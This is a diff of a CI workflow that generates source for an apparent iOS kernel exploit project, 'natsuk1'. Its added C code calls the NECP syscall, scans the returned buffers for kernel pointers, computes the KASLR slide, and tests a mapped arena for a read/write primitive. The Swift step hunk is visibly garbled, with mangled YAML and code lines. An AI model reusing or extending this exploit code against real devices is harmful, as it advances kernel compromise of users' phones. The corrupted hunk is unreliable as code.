@@ -105,7 +105,9 @@ jobs:
           #include <errno.h>
           #include <sys/syscall.h>
           #include <mach/mach.h>
+          #include <mach/mach_vm.h>
           #include <mach/message.h>
+          #include <mach/vm_region.h>
 
           #include "nk_api.h"
           #include "nk_offsets.h"
@@ -219,6 +221,25 @@ jobs:
               return found;
           }
 
+          static void tlv_walk(const char *tag, const uint8_t *buf, int len) {
+              int off = 0;
+              while (off + 5 <= len) {
+                  uint8_t type = buf[off];
+                  uint32_t l = 0;
+                  memcpy(&l, buf + off + 1, 4);
+                  if (l > (uint32_t)(len - off - 5)) {
+                      LI(tag, "off=%d type=0x%02x len=%u (truncated)", off, type, l);
+                      break;
+                  }
+                  LI(tag, "off=%d type=0x%02x len=%u", off, type, l);
+                  off += 5 + l;
+                  if (l == 0) {
+                      LI(tag, "zero-len TLV, stopping");
+                      break;
+                  }
+              }
+          }
+
           static int step_copy_result(void) {
               nk_log("");
               LI("S1", "copy_result: add_client + add_flow + remove x2 + copy_result");
@@ -240,13 +261,92 @@ jobs:
               LI("S1", "copy_result=%d bytes", c);
               close(fd);
               if (c > 0) {
-                  LI("S1", "hexdump:");
-                  hexdump("S1H", buf, c, 256);
+                  hexdump("S1H", buf, c, 512);
                   int nk = scan_kptr("S1K", buf, c);
                   LI("S1", "kptr count = %d", nk);
-                  if (nk == 0) LR("S1", "no kernel pointers in returned buffer");
+                  LI("S1", "TLV walk:");
+                  tlv_walk("S1T", buf, c);
               }
               return c;
+          }
+
+          static int probe_arena(uint64_t uva) {
+              if (!is_user_va(uva)) {
+                  LW("AR", "0x%llx not user VA", (unsigned long long)uva);
+                  return -1;
+              }
+
+              mach_port_t task = mach_task_self();
+              vm_address_t addr = (vm_address_t)uva;
+              vm_size_t size = 0;
+              vm_region_basic_info_data_64_t info;
+              mach_msg_type_number_t count = VM_REGION_BASIC_INFO_COUNT_64;
+              mach_port_t object_name = MACH_PORT_NULL;
+
+              kern_return_t kr = vm_region_64(task, &addr, &size,
+                                              VM_REGION_BASIC_INFO_64,
+                                              (vm_region_info_t)&info, &count,
+                                              &object_name);
+
+              if (kr != KERN_SUCCESS) {
+                  LE("AR", "vm_region kr=%d", kr);
+                  return -1;
+              }
+
+              LI("AR", "region start=0x%llx size=0x%llx prot=%d maxprot=%d",
+                 (unsigned long long)addr, (unsigned long long)size,
+                 info.protection, info.max_protection);
+              LI("AR", "readable=%d writable=%d executable=%d",
+                 (info.protection & VM_PROT_READ) != 0,
+                 (info.protection & VM_PROT_WRITE) != 0,
+                 (info.protection & VM_PROT_EXECUTE) != 0);
+
+              uint8_t rbuf[256];
+              memset(rbuf, 0, sizeof(rbuf));
+              mach_vm_size_t outsz = 0;
+              kr = mach_vm_read_overwrite(task,
+                                          (mach_vm_address_t)uva,
+                                          sizeof(rbuf),
+                                          (mach_vm_address_t)(uintptr_t)rbuf,
+                                          &outsz);
+              if (kr != KERN_SUCCESS) {
+                  LE("AR", "vm_read kr=%d", kr);
+                  return -1;
+              }
+              LI("AR", "read %llu bytes:", (unsigned long long)outsz);
+              hexdump("ARH", rbuf, (int)outsz, 256);
+              int nk = scan_kptr("ARK", rbuf, (int)outsz);
+              LI("AR", "kptr count = %d", nk);
+
+              if (info.protection & VM_PROT_WRITE) {
+                  uint64_t marker = 0xdeadbeefcafebabeULL;
+                  kr = mach_vm_write(task,
+                                     (mach_vm_address_t)uva,
+                                     (vm_offset_t)(uintptr_t)&marker,
+                                     sizeof(marker));
+                  LI("AR", "vm_write kr=%d", kr);
+                  if (kr == KERN_SUCCESS) {
+                      uint64_t verify = 0;
+                      mach_vm_size_t vsz = 0;
+                      kr = mach_vm_read_overwrite(task,
+                                                  (mach_vm_address_t)uva,
+                                                  sizeof(verify),
+                                                  (mach_vm_address_t)(uintptr_t)&verify,
+                                                  &vsz);
+                      if (kr == KERN_SUCCESS) {
+                          LI("AR", "verify read = 0x%llx (expected 0xdeadbeefcafebabe)",
+                             (unsigned long long)verify);
+                          if (verify == marker) {
+                              LO("AR", "ARENA IS WRITABLE AND READBACK WORKS");
+                              LR("AR", "potential write primitive!");
+                          }
+                      }
+                  }
+              } else {
+                  LI("AR", "arena not writable (prot=0x%x)", info.protection);
+              }
+
+              return 0;
           }
 
           static int step_sysctl_arena(void) {
@@ -263,48 +363,29 @@ jobs:
               LI("S2", "op=0x0D rc=%d value=0x%llx", rc, (unsigned long long)val);
               close(fd);
               if (rc != 0) { LE("S2", "op failed rc=%d", rc); return -1; }
+
               if (is_kptr(val)) {
-                  LO("S2", "kernel pointer: 0x%llx", (unsigned long long)val);
+                  LO("S2", "kernel pointer! 0x%llx", (unsigned long long)val);
                   uint64_t slide = val - KBASE;
                   LO("S2", "slide = 0x%llx", (unsigned long long)slide);
                   LO("S2", "base  = 0x%llx", (unsigned long long)(KBASE + slide));
                   return 0;
               }
+
               if (is_user_va(val)) {
-                  LW("S2", "value is user VA: 0x%llx", (unsigned long long)val);
-                  LR("S2", "arena mapped into our space, not a leak");
+                  LI("S2", "treat as user VA 0x%llx, probing...", (unsigned long long)val);
+                  probe_arena(val);
                   return 0;
               }
-              LW("S2", "value out of known ranges: 0x%llx", (unsigned long long)val);
-              return -1;
-          }
 
-          static int step_copy_result_op3(void) {
-              nk_log("");
-              LI("S3", "copy_result op=0x03 variant");
-              int fd = nfd();
-              if (fd < 0) { LE("S3", "open errno=%d", errno); return -1; }
-              uint8_t cu[16]; memset(cu, 0, sizeof(cu));
-              if (nadd_client(fd, cu) != 0) { close(fd); return -1; }
-              uint8_t fu[16];
-              if (nadd_flow(fd, cu, fu) != 0) { close(fd); return -1; }
-              uint8_t buf[RESBUF]; memset(buf, 0, sizeof(buf));
-              int c = (int)syscall(SYS_NECP_ACTION, fd, 0x03,
-                                   (void*)cu, (size_t)16, buf, (size_t)sizeof(buf));
-              LI("S3", "op=0x03 returned %d bytes", c);
-              close(fd);
-              if (c > 0) {
-                  hexdump("S3H", buf, c, 256);
-                  int nk = scan_kptr("S3K", buf, c);
-                  LI("S3", "kptr count = %d", nk);
-              }
-              return c;
+              LW("S2", "value out of ranges: 0x%llx", (unsigned long long)val);
+              return -1;
           }
 
           static int impl(void) {
               nk_log("");
               nk_log("================================================================");
-              nk_log("natsuk1 v4.4 — NECP recon");
+              nk_log("natsuk1 v4.5 — NECP recon");
               nk_log("iOS 27.0 / iPhone14,5 / 24A437");
               nk_log("================================================================");
               nk_log("");
@@ -314,7 +395,6 @@ jobs:
               LO("PRE", "necp_open OK");
               step_copy_result();
               step_sysctl_arena();
-              step_copy_result_op3();
               nk_log("");
               nk_log("======== done ========");
               return 0;
@@ -337,15 +417,15 @@ jobs:
           }
           EOF
 
-      - name: Write natsuk1.swift
+      static - name: let Write natsuk shared1.swift
         run: |
-          cat > natsuk1/natsuk1.swift <<'EOF'
+ =          cat > natsuk1 Lock/natsuk1.swifted <<'EOF'
           import SwiftUI
           import UIKit
           import Foundation
 
           final class LockedBuffer: @unchecked Sendable {
-              nonisolated(unsafe) static let shared = LockedBuffer()
+              nonisolated(unsafe)Buffer()
               private let lock = NSLock()
               private var value: String = ""
               private init() {}
@@ -1446,23 +1526,16 @@ jobs:
           chk "nk_offsets.h"                      "test -s natsuk1/Exploit/nk_offsets.h"
           chk "necp.c"                            "test -s natsuk1/Exploit/necp.c"
           chk "natsuk1.swift"                     "test -s natsuk1/natsuk1.swift"
-          chk "ContentView.swift"                 "test -s natsuk1/Views/ContentView.swift"
-          chk "OverviewView.swift"                "test -s natsuk1/Views/OverviewView.swift"
-          chk "RuntimeView.swift"                 "test -s natsuk1/Views/RuntimeView.swift"
-          chk "AirliftView.swift"                 "test -s natsuk1/Views/AirliftView.swift"
-          chk "SettingsView.swift"                "test -s natsuk1/Views/SettingsView.swift"
-          chk "ToolsView.swift"                   "test -s natsuk1/Views/ToolsView.swift"
-          chk "AboutView.swift"                   "test -s natsuk1/Views/AboutView.swift"
-          chk "DeviceInfoView.swift"              "test -s natsuk1/Views/DeviceInfoView.swift"
-          chk "PathAccessView.swift"              "test -s natsuk1/Views/PathAccessView.swift"
           chk "offsets json"                      "test -s natsuk1/Offsets/iPhone14,5_iOS27.0_24A437.json"
           chk "no scaleEffect"                    "! grep -rq -e 'scaleEffect' natsuk1/"
           chk "no NotSupportedView"               "! grep -q -e 'NotSupportedView' natsuk1/natsuk1.swift"
           chk "no RespringView in ContentView"    "! grep -q -e 'RespringView' natsuk1/Views/ContentView.swift"
-          chk "Timer flusher (not Task)"          "grep -q -e 'Timer.scheduledTimer' natsuk1/natsuk1.swift"
-          chk "no Task flusher"                   "! grep -q -e 'startFlusher.*Task' natsuk1/natsuk1.swift"
+          chk "Timer flusher"                     "grep -q -e 'Timer.scheduledTimer' natsuk1/natsuk1.swift"
           chk "AppState @MainActor"               "grep -q -e '@MainActor' natsuk1/natsuk1.swift"
-          chk "build_and_release removed"         "! test -f .github/workflows/build_and_release.yml"
+          chk "vm_region in necp.c"               "grep -q -e 'vm_region_64' natsuk1/Exploit/necp.c"
+          chk "vm_read_overwrite in necp.c"       "grep -q -e 'mach_vm_read_overwrite' natsuk1/Exploit/necp.c"
+          chk "vm_write in necp.c"                "grep -q -e 'mach_vm_write' natsuk1/Exploit/necp.c"
+          chk "TLV walk in necp.c"                "grep -q -e 'tlv_walk' natsuk1/Exploit/necp.c"
           python3 -c "import json; json.load(open('natsuk1/Offsets/iPhone14,5_iOS27.0_24A437.json'))" || FAIL=1
           echo "  OK   json valid"
           if [ "$FAIL" -ne 0 ]; then echo "VERIFY FAILED"; exit 1; fi
@@ -1511,7 +1584,7 @@ jobs:
           NOTES="$(cat <<EOF
           ### natsuk1 — iOS 27.0 (24A437)
 
-          v4.4 — MainActor-isolated AppState, Timer-based flusher, no @Published mutations off main thread.
+          v4.5 — safe arena probe (vm_region, mach_vm_read_overwrite, mach_vm_write).
 
           **IPA** \`${IPA_URL}\`
 
@@ -1536,5 +1609,5 @@ jobs:
           git config user.email "github-actions[bot]@users.noreply.github.com"
           git add -A
           if git diff --cached --quiet; then echo "no changes"; exit 0; fi
-          git commit -m "v4.4: MainActor AppState, Timer flusher, NonisolatedNonsending off [skip ci]"
+          git commit -m "v4.5: safe arena probe via vm_region + mach_vm_read/write [skip ci]"
           git push
